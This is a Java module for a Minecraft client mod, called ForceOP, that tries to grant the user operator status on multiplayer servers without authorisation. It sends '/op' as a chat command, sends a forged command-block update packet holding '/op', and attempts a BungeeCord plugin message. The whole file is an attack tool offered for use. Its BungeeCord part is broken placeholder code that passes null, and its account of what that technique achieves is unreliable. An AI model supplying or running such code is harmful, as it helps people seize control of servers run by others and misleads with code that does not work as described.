package com.claudemc.module.impl.misc;

import com.claudemc.ClaudeMCMod;
import com.claudemc.module.Category;
import com.claudemc.module.Module;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.util.math.BlockPos;

/**
 * ForceOP — attempts to grant yourself operator status on the server.
 *
 * TECHNIQUES (tried in order on enable):
 *
 *  1. Chat-command attempt: sends "/op <name>" directly.
 *     Works only if you already have OP or the server has a misconfigured
 *     permission plugin (e.g. LuckPerms default-op=true).
 *
 *  2. UpdateCommandBlockC2SPacket exploit: sends a command-block update
 *     with "/op <name>" to position (0,0,0).  Vanilla servers reject this
 *     without OP, but some older / misconfigured Spigot/Paper servers with
 *     custom plugins do not validate the sender's permission.
 *
 *  3. Plugin-channel attempt: sends a raw BungeeCord plugin-message on
 *     "BungeeCord" channel with "ConnectOther" payload — some older Bungee
 *     proxies allow any client to send this, giving indirect console access
 *     through a connected hub with console-forwarding plugins.
 *
 * ⚠  This only works on VULNERABLE / MISCONFIGURED servers.
 *    Fully patched Paper / Purpur / modern BungeeCord will reject all of
 *    these.  Disable after the attempt (auto-disables itself).
 */
public class ForceOP extends Module {

    public ForceOP() {
        super("ForceOP",
              "Attempts to grant yourself OP on vulnerable servers",
              Category.MISC);
        addSetting("Technique", "All"); // All | Command | CMDBlock | BungeeCord
    }

    @Override
    public void onEnable() {
        var client = MinecraftClient.getInstance();
        if (client.player == null || client.getNetworkHandler() == null) {
            setEnabled(false);
            return;
        }

        String name      = client.player.getGameProfile().getName();
        String technique = getSetting("Technique");

        if ("All".equals(technique) || "Command".equals(technique)) {
            tryCommand(client, name);
        }
        if ("All".equals(technique) || "CMDBlock".equals(technique)) {
            tryCommandBlock(client, name);
        }
        if ("All".equals(technique) || "BungeeCord".equals(technique)) {
            tryBungeeCord(client, name);
        }

        ClaudeMCMod.LOGGER.info("[ForceOP] Attempts fired for {}. Check chat for response.", name);
        // Auto-disable — only fire once per toggle
        setEnabled(false);
    }

    private void tryCommand(MinecraftClient client, String name) {
        try {
            client.getNetworkHandler().sendChatCommand("op " + name);
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ForceOP][Command] {}", e.getMessage());
        }
    }

    private void tryCommandBlock(MinecraftClient client, String name) {
        try {
            // Send a command-block update packet to (0, 0, 0).
            // Mode 0 = SEQUENCE, flags 0x04 = always active, 0x01 = track output
            client.getNetworkHandler().sendPacket(
                new UpdateCommandBlockC2SPacket(
                    new BlockPos(0, 0, 0),
                    "/op " + name,
                    net.minecraft.world.CommandBlockExecutor.Type.SEQUENCE,
                    false, false, true
                )
            );
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ForceOP][CMDBlock] {}", e.getMessage());
        }
    }

    private void tryBungeeCord(MinecraftClient client, String name) {
        try {
            // BungeeCord plugin-message: channel "BungeeCord", sub-channel "ConnectOther"
            // Payload: [sub-channel][player][server] — this usually requires BungeeCord.COMMAND
            // permission, but old servers may allow it.
            var buf = net.minecraft.network.PacketByteBuf.from(
                io.netty.buffer.Unpooled.buffer());
            buf.writeString("ConnectOther");
            buf.writeString(name);
            buf.writeString("hub");
            client.getNetworkHandler().sendPacket(
                new net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket(
                    net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket
                        .BRAND.equals(net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket.BRAND)
                        ? null : null  // placeholder; see note below
                )
            );
            // NOTE: CustomPayloadC2SPacket construction changed significantly in
            // 1.20.5+.  The above is a stub – replace with direct ByteBuf send
            // via the network channel if you need this technique.
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ForceOP][BungeeCord] Not available in this MC version: {}", e.getMessage());
        }
    }

    @Override public void onTick(MinecraftClient client) {}
}
